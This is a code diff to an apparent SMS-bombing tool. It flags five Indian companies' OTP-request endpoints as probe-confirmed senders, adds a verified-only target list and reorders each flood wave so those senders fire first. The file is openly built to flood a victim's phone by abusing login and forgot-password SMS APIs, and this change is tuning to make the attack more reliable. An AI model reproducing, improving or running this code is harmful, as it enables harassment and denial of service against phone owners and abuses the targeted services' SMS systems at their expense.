@@ -653,6 +653,7 @@ TARGETS = TARGETS_CALL + [
     {
         "name": "PharmEasy",
         "category": "healthcare",
+        "verified": True,   # probe 2026-04-26: HTTP 200, status:1 + resendSmsCounter — strong delivery signal
         "url": "https://pharmeasy.in/api/auth/requestOTP",
         "method": "POST",
         "content_type": "json",
@@ -771,6 +772,7 @@ TARGETS = TARGETS_CALL + [
     {
         "name": "RedBus",
         "category": "travel",
+        "verified": True,   # probe 2026-04-26: OTP_SENT — explicit keyword confirmed
         "url": "https://m.redbus.in/api/getOtp?number=<PHONE>&cc=91&whatsAppOpted=false",
         "method": "GET",
         "content_type": "json",
@@ -811,6 +813,7 @@ TARGETS = TARGETS_CALL + [
     {
         "name": "Treebo",
         "category": "travel",
+        "verified": True,   # probe 2026-04-26: OTP_SENT — explicit keyword confirmed
         "url": "https://www.treebo.com/api/v2/auth/login/otp/",
         "method": "POST",
         "content_type": "json",
@@ -877,6 +880,7 @@ TARGETS = TARGETS_CALL + [
     {
         "name": "UrbanCompany",
         "category": "booking",
+        "verified": True,   # probe 2026-04-26: OTP_SENT — otpGenerated:true confirmed
         "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
         "method": "POST",
         "content_type": "json",
@@ -910,6 +914,7 @@ TARGETS = TARGETS_CALL + [
     {
         "name": "JustDial",
         "category": "services",
+        "verified": True,   # probe 2026-04-26: OTP_SENT — explicit keyword confirmed
         "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
         "method": "GET",
         "content_type": "json",
@@ -1242,6 +1247,13 @@ TARGETS = TARGETS_CALL + [
         "payload": {"phoneNumber": "<PHONE>", "countryCode": "+91"}
     },
 ]
+
+# ─────────────────────────────────────────────────────────────
+#  VERIFIED-ONLY SHORTLIST  (probe-confirmed real SMS delivery)
+#  Updated: 2026-04-26 — 99-target live phone test
+#  Use this list when you want ONLY proven senders (faster, reliable).
+# ─────────────────────────────────────────────────────────────
+VERIFIED_TARGETS = [t for t in TARGETS if t.get("verified")]
 
 # ─────────────────────────────────────────────────────────────
 #  PHASE 4.1 — RECOVERY TARGETS (Vector B: Forgot-Password SMS)
@@ -2202,6 +2214,11 @@ def run_wave(phone: str, targets: list, wave_num: int, debug: bool, stagger: flo
     wave_results = []
     # Phase 3.2 — Smart Wave Composer: re-rank, amplify top performers, prune chronic blockers
     shuffled = compose_smart_wave(targets)
+
+    # Verified-first ordering: always fire the 5 probe-confirmed senders at the front of every wave
+    _verified = [t for t in shuffled if t.get("verified")]
+    _rest     = [t for t in shuffled if not t.get("verified")]
+    shuffled  = _verified + _rest
 
     # ── Vector A: Primary SMS flood ─────────────────────────
     threads = []
